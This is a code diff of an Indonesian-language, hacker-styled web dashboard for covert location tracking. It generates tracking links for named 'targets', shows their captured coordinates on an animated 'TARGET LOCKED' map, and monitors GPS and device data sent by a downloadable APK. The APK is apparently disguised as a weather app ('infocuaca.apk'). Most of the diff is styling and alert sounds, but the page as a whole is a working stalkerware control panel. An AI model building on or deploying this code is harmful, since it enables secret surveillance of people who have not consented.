@@ -12,7 +12,7 @@
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Courier New', monospace;
-      background: #000000;
+      background: #000;
       color: #00ff41;
       min-height: 100vh;
       padding: 10px;
@@ -26,9 +26,7 @@
       background: repeating-linear-gradient(0deg, rgba(0,255,65,0.03) 0px, rgba(0,255,65,0.03) 1px, transparent 1px, transparent 2px);
       pointer-events: none;
       z-index: 9999;
-      animation: flicker 0.15s infinite;
     }
-    @keyframes flicker { 0% { opacity: 0.97; } 50% { opacity: 1; } 100% { opacity: 0.98; } }
     body::after {
       content: '';
       position: fixed;
@@ -40,48 +38,59 @@
 
     .wrap { position: relative; z-index: 2; max-width: 600px; margin: 0 auto; }
 
-    /* TERMINAL WINDOW */
+    /* HEADER */
     .term-header {
       background: #0a0a0a;
-      border: 1px solid #00ff41;
+      border: 2px solid #00ff41;
       border-bottom: none;
-      padding: 8px 12px;
+      padding: 10px 14px;
       display: flex;
       justify-content: space-between;
       align-items: center;
       font-size: 11px;
       letter-spacing: 1px;
-      border-radius: 4px 4px 0 0;
+      border-radius: 6px 6px 0 0;
+      box-shadow: 0 0 15px rgba(0,255,65,0.3);
     }
-    .term-header .dots { display: flex; gap: 5px; }
-    .term-header .dot { width: 10px; height: 10px; border-radius: 50%; }
-    .term-header .dot.red { background: #ff3366; }
-    .term-header .dot.yellow { background: #ffcc00; }
-    .term-header .dot.green { background: #00ff41; }
+    .term-header .dots { display: flex; gap: 6px; }
+    .term-header .dot { width: 11px; height: 11px; border-radius: 50%; }
+    .term-header .dot.red { background: #ff3366; box-shadow: 0 0 5px #ff3366; }
+    .term-header .dot.yellow { background: #ffcc00; box-shadow: 0 0 5px #ffcc00; }
+    .term-header .dot.green { background: #00ff41; box-shadow: 0 0 5px #00ff41; }
     .term-header .title {
       color: #00ff41;
       font-weight: bold;
-      text-shadow: 0 0 5px #00ff41;
+      text-shadow: 0 0 8px #00ff41;
       flex: 1;
       text-align: center;
-      letter-spacing: 2px;
+      letter-spacing: 3px;
     }
 
+    /* BODY */
     .term-body {
       background: #0a0a0a;
-      border: 1px solid #00ff41;
-      border-radius: 0 0 4px 4px;
-      padding: 12px;
-      margin-bottom: 12px;
-      box-shadow: 0 0 20px rgba(0,255,65,0.2), inset 0 0 30px rgba(0,255,65,0.02);
+      border: 2px solid #00ff41;
+      border-radius: 6px;
+      padding: 14px;
+      margin-bottom: 14px;
+      box-shadow: 0 0 15px rgba(0,255,65,0.25), inset 0 0 20px rgba(0,255,65,0.03);
+      position: relative;
     }
-    .term-body.square { border-radius: 4px; }
+    .term-body::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 12px; right: 12px;
+      height: 2px;
+      background: #00ff41;
+      box-shadow: 0 0 8px #00ff41;
+    }
+    .term-body.first { border-radius: 0 0 6px 6px; }
 
     .prompt {
       color: #00ff41;
       font-size: 11px;
       letter-spacing: 0.5px;
-      margin-bottom: 8px;
+      margin-bottom: 10px;
       text-shadow: 0 0 3px #00ff41;
     }
     .prompt::before { content: 'root@cyber:~# '; color: #00ff41; }
@@ -93,10 +102,11 @@
       color: #00ff41;
       font-family: 'Courier New', monospace;
       font-size: 13px;
-      padding: 10px 12px;
+      padding: 11px 12px;
       outline: none;
       letter-spacing: 1px;
       margin-bottom: 10px;
+      border-radius: 3px;
     }
     .term-input::placeholder { color: rgba(0,255,65,0.4); }
     .term-input:focus { box-shadow: 0 0 15px #00ff41, inset 0 0 10px rgba(0,255,65,0.1); }
@@ -110,33 +120,22 @@
       font-size: 12px;
       font-weight: bold;
       letter-spacing: 2px;
-      padding: 11px;
+      padding: 12px;
       cursor: pointer;
       text-transform: uppercase;
       transition: all 0.2s;
       margin-bottom: 6px;
+      border-radius: 3px;
     }
     .term-btn:hover {
       background: #000;
       color: #00ff41;
       box-shadow: 0 0 20px #00ff41, inset 0 0 10px #00ff41;
     }
-    .term-btn.outline {
-      background: transparent;
-      color: #00ff41;
-      border: 1px solid #00ff41;
-    }
+    .term-btn.outline { background: transparent; color: #00ff41; border: 1px solid #00ff41; }
     .term-btn.outline:hover { background: #00ff41; color: #000; }
-    .term-btn.danger {
-      background: transparent;
-      color: #ff3366;
-      border: 1px solid #ff3366;
-    }
-    .term-btn.danger:hover {
-      background: #ff3366;
-      color: #000;
-      box-shadow: 0 0 20px #ff3366;
-    }
+    .term-btn.danger { background: transparent; color: #ff3366; border: 1px solid #ff3366; }
+    .term-btn.danger:hover { background: #ff3366; color: #000; box-shadow: 0 0 20px #ff3366; }
 
     .term-info { font-size: 11px; line-height: 1.9; color: #00ff41; margin-bottom: 8px; }
     .term-info .k { color: #7fff7f; display: inline-block; min-width: 100px; }
@@ -145,8 +144,7 @@
 
     .dot-status {
       display: inline-block;
-      width: 8px;
-      height: 8px;
+      width: 8px; height: 8px;
       border-radius: 50%;
       background: #00ff41;
       margin-right: 5px;
@@ -170,10 +168,12 @@
       position: relative;
       width: 100%;
       height: 280px;
-      border: 1px solid #00ff41;
-      margin-bottom: 10px;
+      border: 2px solid #00ff41;
+      margin-bottom: 12px;
       background: #000;
       overflow: hidden;
+      border-radius: 4px;
+      box-shadow: inset 0 0 20px rgba(0,255,65,0.1);
     }
     .map-box .map-el { width: 100%; height: 100%; filter: hue-rotate(90deg) saturate(1.5) brightness(0.8) contrast(1.3); }
     .map-grid {
@@ -212,6 +212,7 @@
       letter-spacing: 1px;
       z-index: 600;
       text-shadow: 0 0 3px #00ff41;
+      border-radius: 2px;
     }
     .map-label::before { content: '● '; animation: blink 1s infinite; }
     @keyframes blink { 50% { opacity: 0.3; } }
@@ -223,6 +224,7 @@
       font-size: 9px;
       padding: 3px 8px;
       z-index: 600;
+      border-radius: 2px;
     }
 
     .target-popup .leaflet-popup-content-wrapper {
@@ -234,16 +236,6 @@
     }
     .target-popup .leaflet-popup-tip { background: #00ff41; }
     .target-popup .leaflet-popup-content { margin: 8px; font-family: 'Courier New', monospace; font-size: 10px; }
-
-    .cursor {
-      display: inline-block;
-      width: 8px; height: 14px;
-      background: #00ff41;
-      animation: cursorBlink 0.8s infinite;
-      vertical-align: middle;
-      margin-left: 3px;
-    }
-    @keyframes cursorBlink { 0%, 49% { opacity: 1; } 50%, 100% { opacity: 0; } }
 
     .top-bar {
       display: flex;
@@ -264,6 +256,7 @@
       padding: 5px 10px;
       cursor: pointer;
       letter-spacing: 1px;
+      border-radius: 3px;
     }
     .logout-btn { border-color: #ff3366; color: #ff3366; }
     .logout-btn:hover { background: #ff3366; color: #000; }
@@ -271,10 +264,9 @@
     .chat-btn { border-color: #00ffff; color: #00ffff; }
     .chat-btn:hover { background: #00ffff; color: #000; }
 
-    /* CHAT PANEL */
+    /* CHAT */
     .chat-panel {
-      position: fixed;
-      inset: 0;
+      position: fixed; inset: 0;
       background: #000;
       z-index: 99999;
       display: none;
@@ -282,19 +274,14 @@
       padding: 10px;
     }
     .chat-panel.show { display: flex; }
-    .chat-panel::before {
-      content: '';
-      position: absolute; inset: 0;
-      background: repeating-linear-gradient(0deg, rgba(0,255,65,0.03) 0px, rgba(0,255,65,0.03) 1px, transparent 1px, transparent 2px);
-      pointer-events: none;
-    }
     .chat-inner {
       position: relative; z-index: 2;
       max-width: 600px; margin: 0 auto; width: 100%; height: 100%;
       display: flex; flex-direction: column;
-      border: 1px solid #00ff41;
-      border-radius: 4px;
+      border: 2px solid #00ff41;
+      border-radius: 6px;
       overflow: hidden;
+      box-shadow: 0 0 20px rgba(0,255,65,0.3);
     }
     .chat-head {
       display: flex; justify-content: space-between; align-items: center;
@@ -306,24 +293,15 @@
     }
     .chat-head .title { color: #00ff41; text-shadow: 0 0 5px #00ff41; font-weight: bold; }
     .chat-close {
-      background: transparent;
-      border: 1px solid #ff3366;
-      color: #ff3366;
-      font-family: 'Courier New', monospace;
-      font-size: 10px;
-      padding: 5px 10px;
-      cursor: pointer;
+      background: transparent; border: 1px solid #ff3366; color: #ff3366;
+      font-family: 'Courier New', monospace; font-size: 10px;
+      padding: 5px 10px; cursor: pointer; border-radius: 3px;
     }
     .chat-close:hover { background: #ff3366; color: #000; }
     .chat-msgs {
-      flex: 1;
-      overflow-y: auto;
-      padding: 12px;
+      flex: 1; overflow-y: auto; padding: 12px;
       background: #000;
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      font-size: 12px;
+      display: flex; flex-direction: column; gap: 8px;
     }
     .chat-msgs::-webkit-scrollbar { width: 5px; }
     .chat-msgs::-webkit-scrollbar-track { background: rgba(0,255,65,0.05); }
@@ -337,46 +315,31 @@
     .chat-msg.mine { border-left-color: #00ffff; background: rgba(0,255,255,0.04); }
     .chat-msg .mhead {
       display: flex; justify-content: space-between;
-      font-size: 9px;
-      color: #7fff7f;
-      margin-bottom: 3px;
+      font-size: 9px; color: #7fff7f; margin-bottom: 3px;
     }
     .chat-msg .muser { color: #00ff41; font-weight: bold; text-shadow: 0 0 3px #00ff41; }
     .chat-msg.mine .muser { color: #00ffff; text-shadow: 0 0 3px #00ffff; }
     .chat-msg .mtext { color: #d0ffd0; font-size: 12px; line-height: 1.4; }
     .chat-msg .mdel {
       background: transparent; border: none; color: #ff3366;
-      font-size: 11px; cursor: pointer; padding: 0 4px;
-      opacity: 0.5;
+      font-size: 11px; cursor: pointer; padding: 0 4px; opacity: 0.5;
     }
     .chat-msg .mdel:hover { opacity: 1; }
     .chat-input-row {
-      display: flex;
-      background: #0a0a0a;
-      border-top: 1px solid #00ff41;
-      padding: 8px;
+      display: flex; background: #0a0a0a;
+      border-top: 1px solid #00ff41; padding: 8px;
     }
     .chat-input-row input {
-      flex: 1;
-      background: #000;
-      border: 1px solid #00ff41;
-      color: #00ff41;
-      font-family: 'Courier New', monospace;
-      font-size: 12px;
-      padding: 10px;
-      outline: none;
+      flex: 1; background: #000; border: 1px solid #00ff41;
+      color: #00ff41; font-family: 'Courier New', monospace;
+      font-size: 12px; padding: 10px; outline: none; border-radius: 3px;
     }
     .chat-input-row input::placeholder { color: rgba(0,255,65,0.4); }
     .chat-input-row button {
-      background: #00ff41;
-      color: #000;
-      border: none;
-      font-family: 'Courier New', monospace;
-      font-size: 11px;
-      font-weight: bold;
-      padding: 0 15px;
-      letter-spacing: 1px;
-      cursor: pointer;
+      background: #00ff41; color: #000; border: none;
+      font-family: 'Courier New', monospace; font-size: 11px;
+      font-weight: bold; padding: 0 15px; letter-spacing: 1px;
+      cursor: pointer; border-radius: 3px;
     }
     .chat-input-row button:hover { box-shadow: 0 0 15px #00ff41; }
 
@@ -386,12 +349,11 @@
       padding: 10px;
       margin-bottom: 10px;
       background: rgba(0,255,65,0.02);
-      position: relative;
+      border-radius: 3px;
     }
     .card-data .card-top {
       display: flex; justify-content: space-between;
-      font-size: 9px;
-      color: #7fff7f;
+      font-size: 9px; color: #7fff7f;
       padding-bottom: 6px;
       border-bottom: 1px dashed #00ff41;
       margin-bottom: 8px;
@@ -402,65 +364,38 @@
     .card-data .card-body .v { color: #00ff41; }
     .card-data .card-body .v a { color: #00ffff; text-decoration: none; border-bottom: 1px dashed #00ffff; }
     .card-data .card-photo {
-      width: 100%;
-      max-width: 150px;
-      border: 1px solid #00ff41;
-      margin: 8px 0;
-      display: block;
+      width: 100%; max-width: 150px;
+      border: 1px solid #00ff41; margin: 8px 0; display: block;
       filter: brightness(1.4) contrast(1.1);
     }
     .card-data .card-actions {
       display: flex; gap: 6px;
-      margin-top: 8px;
-      padding-top: 8px;
+      margin-top: 8px; padding-top: 8px;
       border-top: 1px dashed #00ff41;
     }
     .card-data .card-actions button {
-      flex: 1;
-      background: transparent;
-      border: 1px solid #00ff41;
-      color: #00ff41;
+      flex: 1; background: transparent;
+      border: 1px solid #00ff41; color: #00ff41;
       font-family: 'Courier New', monospace;
-      font-size: 9px;
-      padding: 6px;
-      cursor: pointer;
-      letter-spacing: 0.5px;
+      font-size: 9px; padding: 6px; cursor: pointer;
+      letter-spacing: 0.5px; border-radius: 3px;
     }
     .card-data .card-actions button.del { border-color: #ff3366; color: #ff3366; }
     .card-data .card-actions button:hover { background: #00ff41; color: #000; }
     .card-data .card-actions button.del:hover { background: #ff3366; color: #000; }
 
-    .empty {
-      color: rgba(0,255,65,0.4);
-      font-size: 11px;
-      text-align: center;
-      padding: 15px;
-    }
+    .empty { color: rgba(0,255,65,0.4); font-size: 11px; text-align: center; padding: 15px; }
 
-    .search-row {
-      display: flex;
-      gap: 6px;
-      margin-bottom: 8px;
-    }
+    .search-row { display: flex; gap: 6px; margin-bottom: 8px; }
     .search-row input {
-      flex: 2;
-      background: #000;
-      border: 1px solid #00ff41;
-      color: #00ff41;
-      font-family: 'Courier New', monospace;
-      font-size: 11px;
-      padding: 8px;
-      outline: none;
+      flex: 2; background: #000; border: 1px solid #00ff41;
+      color: #00ff41; font-family: 'Courier New', monospace;
+      font-size: 11px; padding: 8px; outline: none; border-radius: 3px;
     }
     .search-row select {
-      flex: 1;
-      background: #000;
-      border: 1px solid #00ff41;
-      color: #00ff41;
-      font-family: 'Courier New', monospace;
-      font-size: 11px;
-      padding: 8px;
-      outline: none;
+      flex: 1; background: #000; border: 1px solid #00ff41;
+      color: #00ff41; font-family: 'Courier New', monospace;
+      font-size: 11px; padding: 8px; outline: none; border-radius: 3px;
     }
     .search-row input::placeholder { color: rgba(0,255,65,0.4); }
 
@@ -470,7 +405,7 @@
 <body>
   <div class="wrap">
 
-    <!-- TERMINAL HEADER -->
+    <!-- HEADER -->
     <div class="term-header">
       <div class="dots">
         <div class="dot red"></div>
@@ -482,69 +417,43 @@
     </div>
 
     <!-- TOP BAR -->
-    <div class="term-body" style="padding: 10px; border-radius: 0 0 4px 4px;">
+    <div class="term-body first" style="padding: 10px;">
       <div class="top-bar">
         <div>USER: <span id="userLabel" style="color: #00ffff;">...</span></div>
         <div class="time" id="liveClock">--:--:--</div>
         <button class="logout-btn" onclick="logout()">EXIT</button>
       </div>
-      <div style="margin-top: 8px; display: flex; justify-content: space-between; align-items: center; gap: 6px;">
+      <div style="margin-top: 10px; display: flex; justify-content: space-between; align-items: center; gap: 6px;">
         <div style="font-size: 10px; color: #7fff7f;">
           <span class="dot-status"></span>ONLINE
         </div>
         <div style="display: flex; gap: 6px;">
-          <button class="chat-btn" onclick="openChat()">💬 CHAT <span id="chatBadge" style="display:none;background:#ff3366;color:#fff;padding:1px 4px;font-size:9px;">0</span></button>
-          <button class="notif-btn" id="notifToggle" onclick="toggleNotif()">🔔 OFF</button>
+          <button class="chat-btn" onclick="openChat()">💬 CHAT <span id="chatBadge" style="display:none;background:#ff3366;color:#fff;padding:1px 4px;font-size:9px;border-radius:8px;">0</span></button>
+          <button class="notif-btn" id="soundToggle" onclick="toggleSound()">🔊 ON</button>
         </div>
       </div>
     </div>
 
-    <!-- ===============================
-         MONITOR APK (PETA 1)
-         =============================== -->
-    <div class="term-body square">
-      <div class="prompt">[MONITOR] APK LOCATION</div>
-
-      <div class="map-box">
-        <div id="mapApk" class="map-el"></div>
-        <div class="map-grid"></div>
-        <div class="map-crosshair"></div>
-        <div class="map-label">APK TRACKER</div>
-        <div class="map-coords" id="mapApkCoords">--, --</div>
-      </div>
-
-      <div class="term-info">
-        <div><span class="k">USER:</span><span class="v" id="apkUser">-</span></div>
-        <div><span class="k">LAT:</span><span class="v" id="apkLat">-</span></div>
-        <div><span class="k">LNG:</span><span class="v" id="apkLng">-</span></div>
-        <div><span class="k">AKURASI:</span><span class="v" id="apkAkurasi">-</span></div>
-        <div><span class="k">DEVICE:</span><span class="v" id="apkDevice">-</span></div>
-        <div><span class="k">LAST UPDATE:</span><span class="v" id="apkTime">-</span></div>
-      </div>
-
-      <button class="term-btn outline" onclick="bukaMapsApk()">[ BUKA GOOGLE MAPS ]</button>
-    </div>
-
-    <!-- ===============================
-         GENERATE LINK
-         =============================== -->
-    <div class="term-body square">
+    <!-- ============================================
+         GENERATE LINK (ATAS)
+         ============================================ -->
+    <div class="term-body">
       <div class="prompt">[GENERATE] TRACKING LINK</div>
       <div style="font-size: 10px; color: #7fff7f; margin-bottom: 6px;">> input target name:</div>
-      <input id="targetName" class="term-input" placeholder="contoh: budi" autocomplete="off">
+      <input id="targetName" class="term-input" placeholder="contoh: budi" autocomplete="off" oninput="typingSound()">
       <button class="term-btn" onclick="genLink()">[ GENERATE LINK ]</button>
       <div id="linkResult" style="display:none; margin-top: 10px;">
         <div style="font-size: 10px; color: #7fff7f; margin-bottom: 5px;">> target link:</div>
-        <div style="word-break: break-all; background: #000; border: 1px dashed #00ff41; padding: 8px; font-size: 10px; color: #00ffff;" id="linkUrl"></div>
+        <div style="word-break: break-all; background: #000; border: 1px dashed #00ff41; padding: 8px; font-size: 10px; color: #00ffff; border-radius: 3px;" id="linkUrl"></div>
         <button class="term-btn outline" id="btnCopy" onclick="copyLink()" style="margin-top: 8px;">[ 📋 SALIN LINK ]</button>
       </div>
     </div>
 
-    <!-- ===============================
-         DATA LINK TRACKING (PETA 2)
-         =============================== -->
-    <div class="term-body square">
-      <div class="prompt">[DATA] TRACKING RESULTS</div>
+    <!-- ============================================
+         DATA LINK TRACKING (PETA ATAS)
+         ============================================ -->
+    <div class="term-body">
+      <div class="prompt">[DATA] TARGET LOCATION</div>
 
       <div class="map-box" id="mapLinkBox">
         <div id="mapLink" class="map-el"></div>
@@ -578,10 +487,36 @@
       </div>
     </div>
 
-    <!-- ===============================
+    <!-- ============================================
+         MONITOR APK (PETA BAWAH)
+         ============================================ -->
+    <div class="term-body">
+      <div class="prompt">[MONITOR] APK LOCATION</div>
+
+      <div class="map-box">
+        <div id="mapApk" class="map-el"></div>
+        <div class="map-grid"></div>
+        <div class="map-crosshair"></div>
+        <div class="map-label">APK TRACKER</div>
+        <div class="map-coords" id="mapApkCoords">--, --</div>
+      </div>
+
+      <div class="term-info">
+        <div><span class="k">USER:</span><span class="v" id="apkUser">-</span></div>
+        <div><span class="k">LAT:</span><span class="v" id="apkLat">-</span></div>
+        <div><span class="k">LNG:</span><span class="v" id="apkLng">-</span></div>
+        <div><span class="k">AKURASI:</span><span class="v" id="apkAkurasi">-</span></div>
+        <div><span class="k">DEVICE:</span><span class="v" id="apkDevice">-</span></div>
+        <div><span class="k">LAST UPDATE:</span><span class="v" id="apkTime">-</span></div>
+      </div>
+
+      <button class="term-btn outline" onclick="bukaMapsApk()">[ BUKA GOOGLE MAPS ]</button>
+    </div>
+
+    <!-- ============================================
          DOWNLOAD APK
-         =============================== -->
-    <div class="term-body square">
+         ============================================ -->
+    <div class="term-body">
       <div class="prompt">[TOOLS] INSTALL TRACKER APK</div>
 
       <div class="term-info">
@@ -593,21 +528,17 @@
       <div style="border-top: 1px dashed #00ff41; margin: 8px 0; padding-top: 8px; font-size: 10px; line-height: 1.9; color: #00ff41;">
         <div>$ step 1: download file</div>
         <div>$ step 2: install apk</div>
-        <div>$ step 3: input username</div>
+        <div>$ step 3: input ID</div>
         <div>$ step 4: tracking aktif</div>
       </div>
 
       <a href="https://github.com/roraxbali/official/raw/main/infocuaca.apk" target="_blank" style="text-decoration: none;">
         <button class="term-btn">[ ▶ DOWNLOAD APK ]</button>
       </a>
-
-      <div style="font-size: 9px; color: #7fff7f; text-align: center; margin-top: 6px;">
-        root@cyber:~# file: infocuaca.apk <span class="cursor"></span>
-      </div>
     </div>
 
     <!-- SYSTEM LOG -->
-    <div class="term-body square">
+    <div class="term-body">
       <div class="prompt">[SYSTEM] LOG</div>
       <div id="logBox">
         <div class="log-line">Initializing...</div>
@@ -616,9 +547,7 @@
 
   </div>
 
-  <!-- ===============================
-       CHAT PANEL
-       =============================== -->
+  <!-- CHAT PANEL -->
   <div class="chat-panel" id="chatPanel">
     <div class="chat-inner">
       <div class="chat-head">
@@ -629,7 +558,7 @@
         <div class="empty">Loading chat...</div>
       </div>
       <div class="chat-input-row">
-        <input id="chatInput" placeholder="ketik pesan..." onkeypress="if(event.key==='Enter') sendChat()">
+        <input id="chatInput" placeholder="ketik pesan..." oninput="typingSound()" onkeypress="if(event.key==='Enter') sendChat()">
         <button onclick="sendChat()">KIRIM</button>
       </div>
     </div>
@@ -680,41 +609,68 @@ function addLog(msg, type = '') {
 addLog('Terminal v1.0 initialized');
 addLog('User: ' + user);
 
-// ===== NOTIF =====
-let notifEnabled = false;
-window.toggleNotif = () => {
-  notifEnabled = !notifEnabled;
-  const btn = document.getElementById('notifToggle');
-  if (notifEnabled) {
+// ============================================
+// 🔊 SOUND SYSTEM
+// ============================================
+let soundEnabled = true;
+
+window.toggleSound = () => {
+  soundEnabled = !soundEnabled;
+  const btn = document.getElementById('soundToggle');
+  if (soundEnabled) {
+    btn.innerText = '🔊 ON';
     btn.classList.add('active');
-    btn.innerText = '🔔 ON';
-    beep(880, 0.1);
-    setTimeout(() => beep(1200, 0.1), 120);
+    beepSimple(880, 0.1);
   } else {
+    btn.innerText = '🔇 OFF';
     btn.classList.remove('active');
-    btn.innerText = '🔔 OFF';
   }
 };
-function beep(freq, dur) {
-  if (!notifEnabled) return;
+
+function beepSimple(freq, dur) {
+  if (!soundEnabled) return;
   try {
     const ctx = new (window.AudioContext || window.webkitAudioContext)();
     const osc = ctx.createOscillator();
     const gain = ctx.createGain();
-    osc.type = 'square';
+    osc.type = 'sine';
     osc.frequency.value = freq;
-    osc.connect(gain); gain.connect(ctx.destination);
-    gain.gain.setValueAtTime(0.1, ctx.currentTime);
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    gain.gain.setValueAtTime(0.12, ctx.currentTime);
     gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + dur);
-    osc.start(); osc.stop(ctx.currentTime + dur);
+    osc.start();
+    osc.stop(ctx.currentTime + dur);
   } catch(e) {}
 }
-function playAlert() {
-  if (!notifEnabled) return;
-  beep(600, 0.1);
-  setTimeout(() => beep(900, 0.1), 130);
-  setTimeout(() => beep(1200, 0.15), 260);
-  if (navigator.vibrate) navigator.vibrate([80, 40, 80]);
+
+// Bunyi ketik
+function typingSound() {
+  if (!soundEnabled) return;
+  beepSimple(1800 + Math.random() * 400, 0.02);
+}
+
+// Bunyi target locked (10 detik)
+function targetLockedSound() {
+  if (!soundEnabled) return;
+  let count = 0;
+  const timer = setInterval(() => {
+    beepSimple(1600, 0.08);
+    setTimeout(() => beepSimple(2000, 0.08), 80);
+    count++;
+    if (count >= 20) clearInterval(timer);
+  }, 500);
+}
+
+// Bunyi APK update (5 detik)
+function apkUpdateSound() {
+  if (!soundEnabled) return;
+  let count = 0;
+  const timer = setInterval(() => {
+    beepSimple(1200, 0.06);
+    count++;
+    if (count >= 15) clearInterval(timer);
+  }, 333);
 }
 
 window.logout = () => {
@@ -722,8 +678,13 @@ window.logout = () => {
   location.href = 'index.html';
 };
 
-// ===== MAP 1: APK =====
+// ============================================
+// MAP 2: APK (BAWAH)
+// ============================================
 let mapApk = null, markerApk = null;
+let lastApkCount = 0;
+let firstApkLoad = true;
+
 function initMapApk() {
   mapApk = L.map('mapApk', {
     zoomControl: false, attributionControl: false,
@@ -742,8 +703,14 @@ onValue(ref(db, 'lokasi/' + user), snap => {
     document.getElementById('apkTime').innerText = 'Waiting APK...';
     return;
   }
-  const entries = Object.entries(data).sort((a,b) => b[1].waktu - a[1].waktu);
-  const latest = entries[0][1];
+  // Filter data APK (punya mode, tidak punya target)
+  const apkEntries = Object.entries(data)
+    .filter(([k, d]) => d.mode && !d.target)
+    .sort((a,b) => b[1].waktu - a[1].waktu);
+
+  if (apkEntries.length === 0) return;
+
+  const latest = apkEntries[0][1];
 
   document.getElementById('apkUser').innerText = latest.user || user;
   document.getElementById('apkLat').innerText = latest.lat ? latest.lat.toFixed(6) : '-';
@@ -765,6 +732,15 @@ onValue(ref(db, 'lokasi/' + user), snap => {
     }
     mapApk.setView([latest.lat, latest.lng], mapApk.getZoom());
   }
+
+  // Deteksi APK baru → bunyi 5 detik
+  if (!firstApkLoad && apkEntries.length > lastApkCount) {
+    apkUpdateSound();
+    addLog('📡 APK kirim lokasi baru', 'warn');
+    addLog('🔊 Beep: 5 detik');
+  }
+  lastApkCount = apkEntries.length;
+  firstApkLoad = false;
 });
 
 window.bukaMapsApk = () => {
@@ -772,9 +748,12 @@ window.bukaMapsApk = () => {
   const lng = document.getElementById('apkLng').innerText;
   if (lat === '-' || lng === '-') { addLog('No APK location', 'err'); return; }
   window.open('https://www.google.com/maps?q=' + lat + ',' + lng, '_blank');
+  addLog('Opening Google Maps...');
 };
 
-// ===== GENERATE LINK =====
+// ============================================
+// GENERATE LINK
+// ============================================
 let currentLink = '';
 window.genLink = () => {
   const target = document.getElementById('targetName').value.trim() || 'target';
@@ -783,7 +762,7 @@ window.genLink = () => {
   document.getElementById('linkUrl').innerText = url;
   document.getElementById('linkResult').style.display = 'block';
   addLog('Link generated: ' + target);
-  beep(900, 0.08);
+  beepSimple(900, 0.08);
 };
 
 window.copyLink = async () => {
@@ -792,17 +771,18 @@ window.copyLink = async () => {
     await navigator.clipboard.writeText(currentLink);
     document.getElementById('btnCopy').innerText = '[ ✓ TERSALIN ]';
     setTimeout(() => document.getElementById('btnCopy').innerText = '[ 📋 SALIN LINK ]', 2000);
-    addLog('Link copied to clipboard');
-  } catch(e) {
-    addLog('Copy failed: ' + e.message, 'err');
-  }
+    addLog('Link copied');
+  } catch(e) { addLog('Copy failed', 'err'); }
 };
 
-// ===== DATA LINK TRACKING =====
+// ============================================
+// MAP 1: DATA LINK (ATAS)
+// ============================================
 let allData = [];
 let lastCount = 0;
 let firstLoad = true;
 let mapLink = null, markerLink = null;
+let mapAnimated = false;
 
 function initMapLink() {
   mapLink = L.map('mapLink', {
@@ -815,8 +795,6 @@ function initMapLink() {
   }).addTo(mapLink);
 }
 initMapLink();
-
-let mapAnimated = false;
 
 function generateID(waktu) {
   const t = new Date(waktu);
@@ -883,7 +861,6 @@ function renderData() {
     </div>
   `).join('');
 
-  // Animasi peta untuk data terbaru
   if (!mapAnimated && filtered[0][1].lat) {
     mapAnimated = true;
     animasiMapLink(filtered[0][1].lat, filtered[0][1].lng, filtered[0][1].target || 'unknown');
@@ -891,9 +868,7 @@ function renderData() {
 }
 
 function animasiMapLink(lat, lng, target) {
-  if (mapLink) {
-    try { mapLink.remove(); } catch(e) {}
-  }
+  if (mapLink) { try { mapLink.remove(); } catch(e) {} }
   mapLink = L.map('mapLink', {
     zoomControl: false, attributionControl: false,
     dragging: false, scrollWheelZoom: false,
@@ -903,14 +878,15 @@ function animasiMapLink(lat, lng, target) {
     maxZoom: 18
   }).addTo(mapLink);
 
+  // 7 stage × ~1.14 detik = 8 detik
   const stages = [
-    { zoom: 2, center: [0, 20], durasi: 1200, label: 'SATELIT ONLINE' },
-    { zoom: 3, center: [10, 30], durasi: 1000, label: 'MENCARI SINYAL...' },
-    { zoom: 5, center: [lat, lng], durasi: 1200, label: 'SINYAL DITEMUKAN' },
-    { zoom: 8, center: [lat, lng], durasi: 1000, label: 'MENGUNCI WILAYAH' },
-    { zoom: 11, center: [lat, lng], durasi: 1000, label: 'MEMPERBESAR' },
-    { zoom: 14, center: [lat, lng], durasi: 1000, label: 'HAMPIR SELESAI' },
-    { zoom: 16, center: [lat, lng], durasi: 1200, label: 'TARGET LOCKED' }
+    { zoom: 2, center: [0, 20], durasi: 1140, label: 'SATELIT ONLINE' },
+    { zoom: 3, center: [10, 30], durasi: 1140, label: 'MENCARI SINYAL...' },
+    { zoom: 5, center: [lat, lng], durasi: 1140, label: 'SINYAL DITEMUKAN' },
+    { zoom: 8, center: [lat, lng], durasi: 1140, label: 'MENGUNCI WILAYAH' },
+    { zoom: 11, center: [lat, lng], durasi: 1140, label: 'MEMPERBESAR' },
+    { zoom: 14, center: [lat, lng], durasi: 1140, label: 'HAMPIR SELESAI' },
+    { zoom: 16, center: [lat, lng], durasi: 1140, label: 'TARGET LOCKED' }
   ];
 
   const statusEl = document.querySelector('#mapLinkBox .map-label');
@@ -929,17 +905,22 @@ function animasiMapLink(lat, lng, target) {
         '<div style="text-align:center;"><b>◉ ' + target.toUpperCase() + '</b><br>' + lat.toFixed(5) + ', ' + lng.toFixed(5) + '</div>',
         { className: 'target-popup', closeButton: false }
       ).openPopup();
-      if (statusEl) statusEl.innerText = '◉ ' + 'TARGET LOCKED';
+      if (statusEl) statusEl.innerText = '◉ TARGET LOCKED';
+
+      // 🔊 BUNYI TARGET LOCKED (10 detik)
+      targetLockedSound();
+      addLog('🎯 Target locked: ' + target);
+      addLog('🔊 Alert sound: 10 detik');
+
       mapLink.dragging.enable();
       mapLink.scrollWheelZoom.enable();
-      addLog('Target locked: ' + target);
       return;
     }
     const s = stages[idx];
     if (statusEl) statusEl.innerText = '◉ ' + s.label;
     mapLink.flyTo(s.center, s.zoom, { duration: s.durasi/1000, easeLinearity: 0.2 });
     idx++;
-    setTimeout(play, s.durasi + 100);
+    setTimeout(play, s.durasi + 60);
   }
   setTimeout(play, 500);
 }
@@ -953,14 +934,13 @@ onValue(ref(db, 'lokasi/' + user), snap => {
     document.getElementById('countTotal').innerText = '0';
     return;
   }
-  // Filter: hanya data dari LINK (bukan APK) — punya target name
+  // Filter: hanya data dari LINK (punya target)
   allData = Object.entries(data)
     .filter(([k,d]) => d.target)
     .sort((a,b) => b[1].waktu - a[1].waktu);
 
   if (!firstLoad && allData.length > lastCount) {
-    playAlert();
-    addLog('New data received!', 'warn');
+    addLog('New link data received!', 'warn');
   }
   lastCount = allData.length;
   firstLoad = false;
@@ -979,15 +959,14 @@ window.deleteItem = async (key) => {
 };
 
 window.clearAll = async () => {
-  if (!confirm('Yakin hapus SEMUA data LINK? Data APK tidak terhapus.')) return;
+  if (!confirm('Yakin hapus SEMUA data LINK?')) return;
   try {
